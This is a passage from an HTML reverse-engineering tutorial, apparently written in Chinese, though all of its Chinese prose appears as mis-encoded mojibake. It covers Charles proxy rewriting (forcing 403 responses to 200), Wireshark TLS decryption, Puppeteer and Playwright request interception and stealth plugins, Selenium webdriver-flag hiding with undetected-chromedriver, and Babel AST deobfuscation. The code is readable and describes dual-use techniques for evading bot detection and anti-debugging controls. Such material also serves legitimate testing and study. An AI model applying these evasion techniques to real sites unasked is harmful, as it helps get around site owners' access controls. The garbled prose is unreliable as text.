<li>æ‰‹æœºè®¾ç½®ä»£ç†åˆ° Charlesï¼Œæµè§ˆå™¨è®¿é—® <code>chls.pro/ssl</code> ä¸‹è½½å®‰è£…ã€‚</li>
<li><strong>æ³¨æ„</strong>: Android 7.0+ é»˜è®¤ä¸ä¿¡ä»»ç”¨æˆ·å®‰è£…çš„è¯ä¹¦ï¼Œéœ€è¦å°†è¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿåˆ†åŒºï¼ˆéœ€ Rootï¼‰ï¼Œæˆ–ä½¿ç”¨ VirtualXposed / Frida Hook ç»•è¿‡ã€‚</li>
</ul>
</li>
<li><strong>å¼€å¯ SSL ä»£ç†</strong>: <code>Proxy -&gt; SSL Proxying Settings</code>ï¼Œæ·»åŠ  <code>*:443</code>ã€‚</li>
</ol>
<hr />
<h2>2. æ ¸å¿ƒåŠŸèƒ½</h2>
<h3>Map Local (æœ¬åœ°æ˜ å°„)</h3>
<p>è¿™æ˜¯<strong>æ›¿æ¢çº¿ä¸Šæ–‡ä»¶</strong>æœ€å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p>
<ul>
<li><strong>åœºæ™¯</strong>: ä½ åç¼–è¯‘äº†ä¸€ä¸ª JS æ–‡ä»¶ï¼Œå»é™¤äº†åè°ƒè¯•ä»£ç ï¼Œä¿å­˜ä¸º <code>hook.js</code>ã€‚å³ä½¿æ²¡æœ‰ Root æƒé™ï¼Œä½ ä¹Ÿå¯ä»¥è®© APP åŠ è½½è¿™ä¸ªæœ¬åœ°æ–‡ä»¶è€Œä¸æ˜¯çº¿ä¸Šçš„åŸå§‹æ–‡ä»¶ã€‚</li>
<li><strong>æ“ä½œ</strong>: å³é”®è¯·æ±‚ -&gt; <code>Map Local</code> -&gt; Choose ... (é€‰æ‹©ä½ çš„ <code>hook.js</code>)ã€‚</li>
</ul>
<h3>Map Remote (è¿œç¨‹æ˜ å°„)</h3>
<ul>
<li><strong>åœºæ™¯</strong>: å°† APP çš„è¯·æ±‚é‡å®šå‘åˆ°ä½ è‡ªå·±çš„æœåŠ¡å™¨ã€‚</li>
<li><strong>æ“ä½œ</strong>: å³é”®è¯·æ±‚ -&gt; <code>Map Remote</code> -&gt; å¡«å†™æ–°çš„ Host/Portã€‚</li>
</ul>
<h3>Rewrite (é‡å†™)</h3>
<p>æ¯” Map åŠŸèƒ½æ›´ç»†ç²’åº¦ï¼Œç±»ä¼¼äº Burp çš„ &quot;Match and Replace&quot;ã€‚</p>
<ul>
<li><strong>æ“ä½œ</strong>: <code>Tools -&gt; Rewrite</code>ã€‚</li>
<li><strong>åŠŸèƒ½</strong>:<ul>
<li><strong>Add Header</strong>: æ·»åŠ  <code>Cookie</code> æˆ– <code>Token</code>ã€‚</li>
<li><strong>Modify Body</strong>: æ­£åˆ™æ›¿æ¢å“åº”ä½“å†…å®¹ã€‚</li>
<li><strong>Modify Status</strong>: æ¯”å¦‚æŠŠæœåŠ¡å™¨çš„ <code>403</code> å¼ºè¡Œæ”¹æˆ <code>200</code>ã€‚</li>
</ul>
</li>
</ul>
<h3>Breakpoints (æ–­ç‚¹)</h3>
<ul>
<li><strong>æ“ä½œ</strong>: å³é”®è¯·æ±‚ -&gt; <code>Breakpoints</code>ã€‚</li>
<li><strong>åŠŸèƒ½</strong>: è¯·æ±‚å‘å‡ºå‰æ–­ä¸‹ï¼ˆä¿®æ”¹å‚æ•°ï¼‰ï¼Œå“åº”è¿”å›å‰æ–­ä¸‹ï¼ˆä¿®æ”¹æ•°æ®ï¼‰ã€‚</li>
<li><em>æ³¨æ„</em>: Charles çš„æ–­ç‚¹ä¼šé˜»å¡æ•´ä¸ªè¿æ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¶…æ—¶ã€‚å¯¹äºå¤æ‚çš„é€»è¾‘ä¿®æ”¹ï¼Œå»ºè®®ç”¨ Rewrite æˆ– Map Localã€‚</li>
</ul>
<hr />
<h2>3. ç§»åŠ¨ç«¯æŠ“åŒ…æŠ€å·§</h2>
<h3>æŠ“å–é HTTP åè®® (Socks Proxy)</h3>
<p>å¦‚æœ APP ä½¿ç”¨äº†è‡ªå®šä¹‰çš„ TCP åè®®ï¼ŒCharles çš„ HTTP ä»£ç†å¯èƒ½æŠ“ä¸åˆ°ã€‚</p>
<ul>
<li>Charles æ”¯æŒ Socks ä»£ç†æ¨¡å¼ã€‚</li>
<li>æˆ–è€…ç»“åˆ <strong>Postern / Drony</strong> (Android VPN APP) å°†æ‰€æœ‰æµé‡å¼ºåˆ¶è½¬å‘åˆ° Charlesã€‚</li>
</ul>
<h3>è§£å†³ä¹±ç é—®é¢˜</h3>
<p>å¦‚æœæ˜¯ Protobuf æ•°æ®ï¼ŒCharles é»˜è®¤æ˜¾ç¤ºä¹±ç ã€‚</p>
<ul>
<li>å¯ä»¥å®‰è£… &quot;Charles Protobuf Viewer&quot; æ’ä»¶ã€‚</li>
<li>æˆ–è€…å¯¼å‡º raw dataï¼Œä½¿ç”¨ <code>protoc --decode_raw</code> æŸ¥çœ‹ã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>Charles æ˜¯ç§»åŠ¨ç«¯é€†å‘çš„è½»é‡çº§åˆ©å™¨ã€‚</p>
<ul>
<li><strong>Map Local</strong>: æ›¿æ¢ä»£ç ï¼ŒBypass éªŒè¯ã€‚</li>
<li><strong>Rewrite</strong>: ä¿®æ”¹åè®®å­—æ®µã€‚</li>
<li><strong>SSL Proxying</strong>: è§£å¯† HTTPSã€‚</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-19">
                                                <h2>[R18] Wireshark Guide</h2>
                                                <h1>R18: Wireshark æŒ‡å—</h1>
<h2>æ¦‚è¿°</h2>
<p>Wireshark æ˜¯ç½‘ç»œåè®®åˆ†æçš„â€œæ˜¾å¾®é•œâ€ã€‚ä¸ Burp/Charles è¿™ç§ HTTP ä»£ç†ä¸åŒï¼ŒWireshark æ•è·çš„æ˜¯ç½‘å¡å±‚çš„åŸå§‹æ•°æ®åŒ…ï¼ˆTCP/IPï¼‰ã€‚</p>
<p>åœ¨é€†å‘ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ç”¨å®ƒæ¥ï¼š</p>
<ol>
<li>åˆ†æé HTTP çš„ç§æœ‰åè®®ï¼ˆå¦‚ WebSocket é‡Œé¢çš„äºŒè¿›åˆ¶æµï¼Œæˆ–è€… TCP é•¿è¿æ¥ï¼‰ã€‚</li>
<li>åœ¨æ— æ³•è®¾ç½®ä»£ç†çš„æƒ…å†µä¸‹ï¼ˆå¦‚æŸäº› APP å¼€å¯äº† VPN æ£€æµ‹æˆ–ä¸èµ°ç³»ç»Ÿä»£ç†ï¼‰å¼ºåˆ¶æŠ“åŒ…ã€‚</li>
</ol>
<hr />
<h2>1. åŸºç¡€è¿‡æ»¤ (Filters)</h2>
<p>Wireshark çš„è¿‡æ»¤å™¨è¯­æ³•æ˜¯å¿…é¡»æŒæ¡çš„ã€‚</p>
<h3>å¸¸ç”¨è¿‡æ»¤å™¨</h3>
<ul>
<li><strong>æŒ‰åè®®</strong>: <code>http</code>, <code>tls</code>, <code>websocket</code>, <code>tcp</code></li>
<li><strong>æŒ‰ IP</strong>: <code>ip.addr == 1.2.3.4</code> (æºæˆ–ç›®çš„), <code>ip.src == 1.2.3.4</code></li>
<li><strong>æŒ‰ç«¯å£</strong>: <code>tcp.port == 443</code>, <code>udp.port == 53</code></li>
<li><strong>æŒ‰å†…å®¹</strong>: <code>frame contains &quot;password&quot;</code> (äºŒè¿›åˆ¶æœç´¢)</li>
</ul>
<h3>é€»è¾‘ç»„åˆ</h3>
<p><code>ip.addr == 1.2.3.4 &amp;&amp; tcp.port == 8080 || http</code></p>
<hr />
<h2>2. TLS è§£å¯† (å…³é”®ï¼)</h2>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWireshark æŠ“åˆ°çš„ HTTPS åŒ…å…¨æ˜¯ä¹±ç ï¼ˆTLS Encrypted Alertï¼‰ã€‚æˆ‘ä»¬éœ€è¦å¯¼å…¥å¯†é’¥æ‰èƒ½è§£å¯†ã€‚</p>
<h3>æµè§ˆå™¨ç¯å¢ƒ (Key Log)</h3>
<p>Chrome å’Œ Firefox æ”¯æŒå°† TLS ä¼šè¯å¯†é’¥å¯¼å‡ºåˆ°æ–‡ä»¶ã€‚</p>
<ol>
<li><strong>è®¾ç½®ç¯å¢ƒå˜é‡</strong>:<ul>
<li>Windows: <code>set SSLKEYLOGFILE=C:\keys\ssl.log</code></li>
<li>Mac/Linux: <code>export SSLKEYLOGFILE=~/ssl.log</code></li>
</ul>
</li>
<li><strong>å¯åŠ¨æµè§ˆå™¨</strong>: åœ¨åŒä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨æµè§ˆå™¨ï¼ˆ<code>open -a &quot;Google Chrome&quot;</code>ï¼‰ã€‚</li>
<li><strong>é…ç½® Wireshark</strong>:<ul>
<li><code>Preferences -&gt; Protocols -&gt; TLS (æˆ– SSL)</code>ã€‚</li>
<li>åœ¨ <code>(Pre)-Master-Secret log filename</code> ä¸­é€‰æ‹©åˆšæ‰çš„ <code>ssl.log</code> æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>æ­¤æ—¶ï¼ŒWireshark ä¸­çš„ TLS åŒ…ä¼šè‡ªåŠ¨å˜æˆè§£å¯†åçš„ HTTP2/HTTP1.1 æ˜æ–‡ã€‚</li>
</ol>
<h3>ç§»åŠ¨ç«¯ç¯å¢ƒ</h3>
<p>å¯¹äºå®‰å“ APPï¼Œå¾ˆéš¾ç›´æ¥å¯¼å‡º Key Logã€‚é€šå¸¸çš„åšæ³•æ˜¯ï¼š</p>
<ul>
<li>ä½¿ç”¨ Frida è„šæœ¬ Hook OpenSSL åº“çš„ <code>SSL_CTX_set_keylog_callback</code>ï¼Œå°†å¯†é’¥ dump å‡ºæ¥å¹¶é€šè¿‡ adb ä¼ å› PCã€‚</li>
<li>æˆ–è€…ç›´æ¥ä½¿ç”¨åŸºäº Frida çš„æŠ“åŒ…å·¥å…·ï¼ˆå¦‚ r0captureï¼‰ç›´æ¥ä¿å­˜è§£å¯†åçš„ pcapã€‚</li>
</ul>
<hr />
<h2>3. è¿½è¸ªæµ (Follow Stream)</h2>
<p>å³é”®ä»»æ„ä¸€ä¸ªæ•°æ®åŒ… -&gt; <code>Follow</code> -&gt; <code>TCP Stream</code> (æˆ– <code>TLS Stream</code> / <code>HTTP Stream</code>)ã€‚</p>
<ul>
<li>è¿™ä¼šæŠŠå±äºåŒä¸€ä¸ªè¿æ¥çš„æ‰€æœ‰æ•°æ®åŒ…é‡ç»„æˆå®Œæ•´çš„å¯¹è¯å†…å®¹ï¼Œéå¸¸ä¾¿äºåˆ†æç§æœ‰åè®®çš„æ¡æ‰‹å’Œäº¤äº’é€»è¾‘ã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>Wireshark çš„å­¦ä¹ é—¨æ§›è¾ƒé«˜ï¼Œä½†åœ¨å¤„ç†éæ ‡åè®®æˆ–åº•å±‚ç½‘ç»œå¯¹æŠ—æ—¶ï¼Œå®ƒæ˜¯æ— å¯æ›¿ä»£çš„ç»ˆæå·¥å…·ã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-20">
                                                <h2>[R19] Puppeteer & Playwright</h2>
                                                <h1>R19: Puppeteer &amp; Playwright</h1>
<h2>æ¦‚è¿°</h2>
<p>Puppeteer (åŸºäº CDP) å’Œ Playwright (æ”¯æŒå¤šæµè§ˆå™¨) æ˜¯ç°ä»£ Web è‡ªåŠ¨åŒ–çš„é¦–é€‰å·¥å…·ã€‚åœ¨é€†å‘ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨å®ƒä»¬æ¥ï¼š</p>
<ol>
<li><strong>åŠ¨æ€æ¸²æŸ“</strong>: æŠ“å– SPA é¡µé¢æ•°æ®ã€‚</li>
<li><strong>æ¨¡æ‹Ÿç”¨æˆ·</strong>: ç»•è¿‡å¤æ‚çš„è¡Œä¸ºéªŒè¯ç ã€‚</li>
<li><strong>Hook æ³¨å…¥</strong>: åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥ JS ä»£ç ã€‚</li>
</ol>
<hr />
<h2>1. åŸºç¡€å¯åŠ¨ (Puppeteer)</h2>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);

(async () =&gt; {
  const browser = await puppeteer.launch({
    headless: false, // é€†å‘è°ƒè¯•åŠ¡å¿…å¼€å¯æœ‰å¤´æ¨¡å¼
    args: [
      &quot;--no-sandbox&quot;,
      &quot;--disable-setuid-sandbox&quot;,
      &quot;--ignore-certificate-errors&quot;, // å¿½ç•¥è¯ä¹¦é”™è¯¯ï¼ˆé…åˆæŠ“åŒ…ï¼‰
      &quot;--window-size=1920,1080&quot;,
    ],
  });
  const page = await browser.newPage();
  await page.goto(&quot;https://example.com&quot;);
  // ...
})();
</code></pre>
<hr />
<h2>2. å…³é”®é€†å‘æŠ€å·§</h2>
<h3>æ³¨å…¥ Hook ä»£ç  (evaluateOnNewDocument)</h3>
<p>è¿™æ˜¯æœ€é‡è¦çš„åŠŸèƒ½ã€‚åœ¨é¡µé¢æ‰€æœ‰è„šæœ¬æ‰§è¡Œ<strong>ä¹‹å‰</strong>æ‰§è¡Œä½ çš„ä»£ç ã€‚</p>
<pre><code class="language-javascript">// æ³¨å…¥ navigator.webdriver = undefined ä»¥ç»•è¿‡æ£€æµ‹
await page.evaluateOnNewDocument(() =&gt; {
  Object.defineProperty(navigator, &quot;webdriver&quot;, {
    get: () =&gt; undefined,
  });
});
</code></pre>
<h3>è¯·æ±‚æ‹¦æˆª (Request Interception)</h3>
<p>å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹ã€ä¸­æ­¢è¯·æ±‚ã€‚</p>
<pre><code class="language-javascript">await page.setRequestInterception(true);
page.on(&quot;request&quot;, (request) =&gt; {
  if (request.resourceType() === &quot;image&quot;) {
    request.abort(); // åŠ é€ŸæŠ“å–
  } else if (request.url().includes(&quot;sign&quot;)) {
    // ä¿®æ”¹ Header
    const headers = Object.assign({}, request.headers(), {
      &quot;X-Custom-Token&quot;: &quot;hacked&quot;,
    });
    request.continue({ headers });
  } else {
    request.continue();
  }
});
</code></pre>
<h3>CDP Session (ç›´æ¥è°ƒç”¨ DevTools åè®®)</h3>
<p>Puppeteer å°è£…çš„åŠŸèƒ½æœ‰é™ï¼Œå¯ä»¥é€šè¿‡ CDP ç”šè‡³åšæ›´åº•å±‚çš„æ“ä½œã€‚</p>
<pre><code class="language-javascript">const client = await page.target().createCDPSession();
await client.send(&quot;Network.enable&quot;);
// æ¨¡æ‹Ÿå¼±ç½‘ç¯å¢ƒ
await client.send(&quot;Network.emulateNetworkConditions&quot;, {
  offline: false,
  latency: 200,
  downloadThroughput: (780 * 1024) / 8,
  uploadThroughput: (330 * 1024) / 8,
});
</code></pre>
<hr />
<h2>3. Playwright å¯¹æ¯”</h2>
<p>Playwright API è®¾è®¡æ›´ç°ä»£ï¼Œä¸”åŸç”Ÿæ”¯æŒ WebKit (Safari)ã€‚</p>
<ul>
<li><strong>Context éš”ç¦»</strong>: <code>browser.newContext()</code> æå…¶å¿«é€Ÿåœ°åˆ›å»ºéš”ç¦»ç¯å¢ƒï¼ˆCookie äº’ä¸å¹²æ‰°ï¼‰ï¼Œé€‚åˆå¹¶å‘é‡‡é›†ã€‚</li>
<li><strong>é€‰æ‹©å™¨å¼•æ“</strong>: æ”¯æŒ <code>text=&quot;Login&quot;</code>, <code>css=.btn</code>, <code>xpath=//button</code> æ··åˆæœç´¢ï¼Œæ›´é²æ£’ã€‚</li>
</ul>
<hr />
<h2>4. åçˆ¬è™«å¯¹æŠ— (Anti-Detection)</h2>
<p>ç›´æ¥ä½¿ç”¨ Puppeteer/Playwright å¾ˆå®¹æ˜“è¢«è¯†åˆ«ï¼ˆå› ä¸ºæœ‰æŒ‡çº¹ï¼‰ã€‚</p>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<ol>
<li><strong>puppeteer-extra-plugin-stealth</strong>: å¿…è£…æ’ä»¶ã€‚è‡ªåŠ¨æŠ¹é™¤å‡ åç§å¸¸è§æŒ‡çº¹ï¼ˆChrome Runtime, Navigator Permissions, WebGL Vendor ç­‰ï¼‰ã€‚<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer-extra&quot;);
const StealthPlugin = require(&quot;puppeteer-extra-plugin-stealth&quot;);
puppeteer.use(StealthPlugin());
</code></pre>
</li>
<li><strong>æ‹ŸäººåŒ–æ“ä½œ</strong>: ä¸è¦ <code>page.click()</code> ç¬é—´ç‚¹å‡»ï¼Œè€Œæ˜¯ç§»åŠ¨é¼ æ ‡è½¨è¿¹ -&gt; éšæœºåœé¡¿ -&gt; æŒ‰ä¸‹ -&gt; æŠ¬èµ·ã€‚å¯ä»¥ä½¿ç”¨ <code>ghost-cursor</code> ç­‰åº“ã€‚</li>
</ol>
<hr />
<h2>æ€»ç»“</h2>
<p>å¯¹äºé€†å‘å·¥ç¨‹å¸ˆï¼ŒPuppeteer ä¸ä»…ä»…æ˜¯çˆ¬è™«å·¥å…·ï¼Œæ›´æ˜¯ä¸€ä¸ª<strong>å¯ç¼–ç¨‹çš„æµè§ˆå™¨</strong>ã€‚åˆ©ç”¨ <code>evaluateOnNewDocument</code> å’Œ <code>setRequestInterception</code>ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºå‡ºå¼ºå¤§çš„åŠ¨æ€åˆ†æå’Œè§£å¯†ç¯å¢ƒã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-21">
                                                <h2>[R20] Selenium Guide</h2>
                                                <h1>R20: Selenium æŒ‡å—</h1>
<h2>æ¦‚è¿°</h2>
<p>Selenium æ˜¯ Web è‡ªåŠ¨åŒ–é¢†åŸŸçš„å…ƒè€ã€‚è™½ç„¶åœ¨è½»é‡çº§å’ŒæŠ—æ£€æµ‹æ€§ä¸Šä¸å¦‚ Puppeteer/Playwrightï¼Œä½†ç”±äºå…¶ç”Ÿæ€æˆç†Ÿã€å¤šè¯­è¨€æ”¯æŒå¥½ï¼ˆPython/Javaï¼‰ï¼Œä¾ç„¶åœ¨ä¸€äº›å¤§å‹çˆ¬è™«é¡¹ç›®ä¸­æœ‰åº”ç”¨ã€‚</p>
<p>å¯¹äºé€†å‘å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œä¸»è¦éœ€è¦äº†è§£å¦‚ä½• <strong>Bypass Selenium æ£€æµ‹</strong>ã€‚</p>
<hr />
<h2>1. åŸºç¡€ä½¿ç”¨ (Python)</h2>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.chrome.options import Options

options = Options()
# å°½å¯èƒ½ä½¿ç”¨ CDP å‘½ä»¤æ¥è§„é¿æ£€æµ‹
options.add_experimental_option(&quot;excludeSwitches&quot;, [&quot;enable-automation&quot;])
options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=options)
driver.get(&quot;https://example.com&quot;)
</code></pre>
<hr />
<h2>2. åçˆ¬è™«æ£€æµ‹ä¸ç»•è¿‡</h2>
<p>è®¸å¤šç½‘ç«™ä¼šé€šè¿‡ <code>window.navigator.webdriver</code> æ¥æ£€æµ‹ Seleniumã€‚</p>
<h3>æ£€æµ‹åŸç†</h3>
<p>æµè§ˆå™¨å¯åŠ¨æ—¶ï¼Œå¦‚æœæ˜¯è‡ªåŠ¨åŒ–æ§åˆ¶æ¨¡å¼ï¼Œ<code>navigator.webdriver</code> ä¼šè¢«è®¾ç½®ä¸º <code>true</code>ã€‚</p>
<h3>ç»•è¿‡æ–¹æ¡ˆ</h3>
<h4>æ–¹æ¡ˆ A: CDP æ–¹æ³• (æ¨è)</h4>
<p>åœ¨åŠ è½½é¡µé¢å‰ï¼Œæ‰§è¡Œ CDP å‘½ä»¤åˆ é™¤è¯¥å±æ€§ã€‚</p>
<pre><code class="language-python">driver.execute_cdp_cmd(&quot;Page.addScriptToEvaluateOnNewDocument&quot;, {
  &quot;source&quot;: &quot;&quot;&quot;
    Object.defineProperty(navigator, 'webdriver', {
      get: () =&gt; undefined
    })
  &quot;&quot;&quot;
})
</code></pre>
<h4>æ–¹æ¡ˆ B: ä¸­é—´äººä»£ç†</h4>
<p>ä½¿ç”¨ mitmproxy / Burp æ‹¦æˆªå“åº”ï¼Œæ³¨å…¥ JS ä»£ç è¦†ç›– <code>navigator</code> å±æ€§ã€‚</p>
<h4>æ–¹æ¡ˆ C: undetected-chromedriver</h4>
<p>è¿™æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºäº†ç»•è¿‡æ£€æµ‹è€Œä¿®æ”¹è¿‡çš„ ChromeDriver å°è£…åº“ã€‚</p>
<pre><code class="language-bash">pip install undetected-chromedriver
</code></pre>
<pre><code class="language-python">import undetected_chromedriver as uc
driver = uc.Chrome()
driver.get('https://nowsecure.nl') # è¿™æ˜¯ä¸€ä¸ªé«˜å¼ºåº¦æ£€æµ‹ç«™
</code></pre>
<hr />
<h2>3. ä¸ºä»€ä¹ˆé€†å‘ä¸­å¯ä»¥è¾ƒå°‘ç”¨ Seleniumï¼Ÿ</h2>
<ol>
<li><strong>æŒ‡çº¹ä¸¥é‡</strong>: Selenium ç•™ä¸‹çš„ç‰¹å¾æ¯” Puppeteer å¤šå¾—å¤šï¼ˆå¦‚ <code>cdc_</code> å˜é‡ï¼‰ã€‚</li>
<li><strong>Hook ä¸ä¾¿</strong>: è™½ç„¶å¯ä»¥é€šè¿‡ CDP æ³¨å…¥ï¼Œä½†åŸç”Ÿ API å¯¹ Request Interception çš„æ”¯æŒä¸å¦‚ Puppeteer ä¼˜é›…ã€‚</li>
<li><strong>ç¯å¢ƒé‡</strong>: éœ€è¦ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ WebDriverï¼Œå®¹æ˜“å‡ºç°ç‰ˆæœ¬ä¸å…¼å®¹é—®é¢˜ã€‚</li>
</ol>
<hr />
<h2>æ€»ç»“</h2>
<p>å¦‚æœä½ è¦å†™ä¸€ä¸ªæ–°çš„é€†å‘è„šæœ¬ï¼Œå»ºè®®é¦–é€‰ <strong>Puppeteer / Playwright</strong>ã€‚å¦‚æœä½ å¿…é¡»ç»´æŠ¤ç°æœ‰çš„ Selenium é¡¹ç›®ï¼Œè¯·ç†Ÿç»ƒæŒæ¡ <strong>CDP æ³¨å…¥</strong> å’Œ <strong>undetected-chromedriver</strong> æ¥å¯¹æŠ—åçˆ¬è™«ã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-22">
                                                <h2>[R21] AST Tools</h2>
                                                <h1>R21: AST (æŠ½è±¡è¯­æ³•æ ‘) å·¥å…·</h1>
<h2>æ¦‚è¿°</h2>
<p>åœ¨å¯¹æŠ—æ··æ·†ï¼ˆObfuscationï¼‰æ—¶ï¼Œå­—ç¬¦ä¸²æ›¿æ¢å’Œæ­£åˆ™åŒ¹é…å¾€å¾€åŠ›ä¸ä»å¿ƒã€‚AST ä¸ºæˆ‘ä»¬æä¾›äº†æ“ä½œä»£ç ç»“æ„çš„ä¸Šå¸è§†è§’ã€‚é€šè¿‡è§£æ ASTï¼Œæˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°åˆ é™¤æ­»ä»£ç ã€è¿˜åŸæ§åˆ¶æµå¹³å¦åŒ–ã€è®¡ç®—å¸¸é‡è¡¨è¾¾å¼ã€‚</p>
<p><strong>Babel</strong> æ˜¯ç›®å‰ JS é€†å‘ä¸­æœ€å¸¸ç”¨çš„ AST åº“ã€‚å®ƒæä¾›äº†å®Œæ•´çš„ JavaScript è§£æã€è½¬æ¢ã€ç”Ÿæˆèƒ½åŠ›ã€‚</p>
<hr />
<h2>1. æ ¸å¿ƒå·¥ä½œæµ</h2>
<p>ä½¿ç”¨ <code>@babel</code> ç³»åˆ—åŒ…è¿›è¡Œ AST æ“ä½œçš„æ ‡å‡†æµç¨‹ï¼š</p>
<pre><code>æºä»£ç  (String)
    â†“ @babel/parser
AST (æŠ½è±¡è¯­æ³•æ ‘)
    â†“ @babel/traverse (éå†å’Œä¿®æ”¹)
ä¿®æ”¹åçš„ AST
    â†“ @babel/generator
æ–°ä»£ç  (String)
</code></pre>
<h3>1.1 å››ä¸ªæ ¸å¿ƒåŒ…</h3>
<table>
<thead>
<tr>
  <th>åŒ…å</th>
  <th>ä½œç”¨</th>
  <th>ä¸»è¦ API</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>@babel/parser</strong></td>
  <td>ä»£ç  â†’ AST</td>
  <td><code>parse(code)</code></td>
</tr>
<tr>
  <td><strong>@babel/traverse</strong></td>
  <td>éå†/ä¿®æ”¹ AST</td>
  <td><code>traverse(ast, visitor)</code></td>
</tr>
<tr>
  <td><strong>@babel/generator</strong></td>
  <td>AST â†’ ä»£ç </td>
  <td><code>generate(ast)</code></td>
</tr>
<tr>
  <td><strong>@babel/types</strong></td>
  <td>åˆ›å»º/åˆ¤æ–­èŠ‚ç‚¹</td>
  <td><code>t.isIdentifier()</code>, <code>t.numericLiteral()</code></td>
</tr>
</tbody>
</table>
<h3>1.2 ç¤ºä¾‹ä»£ç æ¡†æ¶</h3>
<pre><code class="language-javascript">const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generator = require(&quot;@babel/generator&quot;).default;
const t = require(&quot;@babel/types&quot;);
const fs = require(&quot;fs&quot;);

// 1. è¯»å–å¹¶è§£æ
const code = fs.readFileSync(&quot;obfuscated.js&quot;, &quot;utf-8&quot;);
const ast = parser.parse(code);

// 2. éå†å¹¶ä¿®æ”¹
traverse(ast, {
  // ä½ çš„è¿˜åŸæ’ä»¶å†™åœ¨è¿™é‡Œ
  StringLiteral(path) {
    // ä¾‹å¦‚ï¼šå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸² &quot;\x61&quot; è¿˜åŸä¸º &quot;a&quot;
    if (path.node.extra &amp;&amp; path.node.extra.raw.startsWith('&quot;\\x')) {
      delete path.node.extra;
    }
  },
});

// 3. ç”Ÿæˆæ–°ä»£ç 
const output = generator(ast, {
  jsescOption: { minimal: true }, // ä½¿ç”¨æœ€å°‘çš„è½¬ä¹‰
});

fs.writeFileSync(&quot;deobfuscated.js&quot;, output.code);
console.log(&quot;åæ··æ·†å®Œæˆï¼&quot;);
</code></pre>
<hr />
<h2>2. å¸¸è§åæ··æ·†åœºæ™¯</h2>
<h3>2.1 å¸¸é‡æŠ˜å  (Constant Folding)</h3>
<p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠ <code>3</code> å˜æˆ <code>1 + 2</code>ï¼Œæˆ–æŠŠå­—ç¬¦ä¸²æ‹†åˆ†ä¸º <code>'H' + 'e' + 'l' + 'l' + 'o'</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>: è®¡ç®—å¹¶æ›¿æ¢ä¸ºç»“æœ</p>
<pre><code class="language-javascript">traverse(ast, {
  BinaryExpression(path) {
    // å°è¯•æ±‚å€¼
    const result = path.evaluate();

    // å¦‚æœå¯ä»¥è®¡ç®—å‡ºç¡®å®šçš„å€¼
    if (result.confident) {
      // æ›¿æ¢ä¸ºå­—é¢é‡èŠ‚ç‚¹
      path.replaceWith(t.valueToNode(result.value));
    }
  },
});
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// æ··æ·†å‰
const x = 1 + 2 + 3;
const str = &quot;H&quot; + &quot;e&quot; + &quot;l&quot; + &quot;l&quot; + &quot;o&quot;;

// åæ··æ·†å
const x = 6;
const str = &quot;Hello&quot;;
</code></pre>
<h3>2.2 æ­»ä»£ç æ¶ˆé™¤ (Dead Code Elimination)</h3>
<p><strong>é—®é¢˜</strong>: å……æ–¥ç€æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç </p>
<p><strong>è§£å†³æ–¹æ¡ˆ 1</strong>: åˆ é™¤æ’ä¸º false çš„æ¡ä»¶åˆ†æ”¯</p>
<pre><code class="language-javascript">traverse(ast, {
  IfStatement(path) {
    // è·å–æ¡ä»¶è¡¨è¾¾å¼çš„å€¼
    const test = path.get(&quot;test&quot;).evaluate();

    if (test.confident) {
      if (test.value) {
        // æ¡ä»¶æ’ä¸º trueï¼Œæ›¿æ¢ä¸º consequentï¼ˆif å—ï¼‰
        path.replaceWithMultiple(path.node.consequent.body);
      } else {
        // æ¡ä»¶æ’ä¸º false
        if (path.node.alternate) {
          // æœ‰ else å—ï¼Œæ›¿æ¢ä¸º alternate
          path.replaceWithMultiple(path.node.alternate.body);
        } else {
          // æ²¡æœ‰ elseï¼Œç›´æ¥åˆ é™¤æ•´ä¸ª if è¯­å¥
          path.remove();
        }
      }
    }
  },
});
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// æ··æ·†å‰
if (false) {
  console.log(&quot;I am dead code&quot;);
}
if (true) {
  console.log(&quot;I will always run&quot;);
}

// åæ··æ·†å
console.log(&quot;I will always run&quot;);
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ 2</strong>: åˆ é™¤æœªå¼•ç”¨çš„å˜é‡/å‡½æ•°</p>
<pre><code class="language-javascript">traverse(ast, {
  VariableDeclarator(path) {
    const binding = path.scope.getBinding(path.node.id.name);

    // å¦‚æœå˜é‡ä»æœªè¢«å¼•ç”¨
    if (binding &amp;&amp; !binding.referenced) {
      path.remove();
    }
  },
});
</code></pre>
<h3>2.3 å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</h3>
